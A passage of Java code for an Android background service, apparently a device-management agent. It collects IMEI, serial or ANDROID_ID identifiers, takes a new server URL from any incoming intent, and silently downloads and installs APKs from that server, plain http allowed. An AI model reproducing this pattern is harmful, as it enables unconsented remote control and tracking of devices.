            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (intf.isLoopback() || !intf.isUp()) continue;
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }

    private void broadcastStatus(boolean isConnected) {
        updateNotification(isConnected);
        Intent intent = new Intent(ACTION_STATUS_UPDATE);
        intent.putExtra(EXTRA_IS_CONNECTED, isConnected);
        intent.putExtra(EXTRA_SERVER_URL, currentActiveUrl);
        sendBroadcast(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            boolean needReconnect = intent.hasExtra("RECONNECT");
            String newServerUrl = intent.getStringExtra("server_url");
            if (newServerUrl != null && !newServerUrl.trim().isEmpty()) {
                saveServerUrl(newServerUrl.trim());
                currentActiveUrl = newServerUrl.trim();
                needReconnect = true;
            }
            String newLocalUrl = intent.getStringExtra("local_server_url");
            if (newLocalUrl != null && !newLocalUrl.trim().isEmpty()) {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                prefs.edit().putString(KEY_LOCAL_SERVER_URL, newLocalUrl.trim()).apply();
                needReconnect = true;
            }
            if (needReconnect) {
                runUdpDiscovery();
                initSignalR();
            }
        }
        return START_STICKY;
    }

    @SuppressLint({"HardwareIds", "MissingPermission"})
    private String getDeviceHardwareId() {
        if (cachedHardwareId != null && !cachedHardwareId.isEmpty() && !cachedHardwareId.startsWith("AND-")) {
            return cachedHardwareId;
        }
        String hwId = null;
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    try {
                        hwId = tm.getImei();
                    } catch (Exception ignored) {}
                    if (hwId == null || hwId.trim().isEmpty() || "unknown".equalsIgnoreCase(hwId)) {
                        try { hwId = tm.getImei(0); } catch (Exception ignored) {}
                    }
                    if (hwId == null || hwId.trim().isEmpty() || "unknown".equalsIgnoreCase(hwId)) {
                        try { hwId = tm.getImei(1); } catch (Exception ignored) {}
                    }
                    if (hwId == null || hwId.trim().isEmpty() || "unknown".equalsIgnoreCase(hwId)) {
                        try { hwId = tm.getMeid(); } catch (Exception ignored) {}
                    }
                } else {
                    hwId = tm.getDeviceId();
                }
            }
        } catch (Exception ignored) {}

        if (hwId == null || hwId.trim().isEmpty() || "unknown".equalsIgnoreCase(hwId)) {
            try {
                hwId = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? Build.getSerial() : Build.SERIAL;
            } catch (Exception ignored) {}
        }

        if (hwId == null || hwId.trim().isEmpty() || "unknown".equalsIgnoreCase(hwId)) {
            try {
                hwId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            } catch (Exception ignored) {}
        }

        if (hwId != null && !hwId.isEmpty() && !hwId.startsWith("AND-")) {
            cachedHardwareId = hwId;
        }

        return (hwId != null && !hwId.isEmpty()) ? hwId : "AND-" + Build.MODEL;
    }

    private void performSilentOtaUpdate(String downloadUrl) {
        if (downloadUrl == null || downloadUrl.trim().isEmpty()) return;
        try {
            Log.i(TAG, "Starting remote silent APK download from: " + downloadUrl);
            String fullUrl = downloadUrl;
            if (!downloadUrl.startsWith("http://") && !downloadUrl.startsWith("https://")) {
                // Resolve relative to current server
                String base = currentActiveUrl.replace("/hubs/endpoints", "");
                if (downloadUrl.startsWith("/")) {
                    fullUrl = base + downloadUrl;
                } else {
                    fullUrl = base + "/" + downloadUrl;
                }
            }

            URL url = new URL(fullUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);
            conn.connect();

            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) {
                Log.e(TAG, "Download failed: HTTP " + conn.getResponseCode());
                return;
            }

            int contentLength = conn.getContentLength();
            PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL
            );
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
            }

            int sessionId = packageInstaller.createSession(params);
            PackageInstaller.Session session = packageInstaller.openSession(sessionId);

            try (InputStream in = conn.getInputStream();
                 OutputStream out = session.openWrite("cybershield_update", 0, contentLength)) {
                byte[] buffer = new byte[65536];
                int c;
                while ((c = in.read(buffer)) != -1) {
                    out.write(buffer, 0, c);
                }
                session.fsync(out);
            }

            Intent callbackIntent = new Intent(this, SilentInstallReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this,
                    sessionId,
                    callbackIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S ? PendingIntent.FLAG_MUTABLE : 0)
            );

            Log.i(TAG, "Committing silent package update session " + sessionId + "...");
            session.commit(pendingIntent.getIntentSender());
            session.close();
            Log.i(TAG, "Silent package update session committed successfully.");

        } catch (Exception e) {
            Log.e(TAG, "Error performing silent OTA update: " + e.getMessage(), e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (heartbeatScheduler != null) heartbeatScheduler.shutdownNow();
        if (hubConnection != null) hubConnection.stop().blockingAwait();
        broadcastStatus(false);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
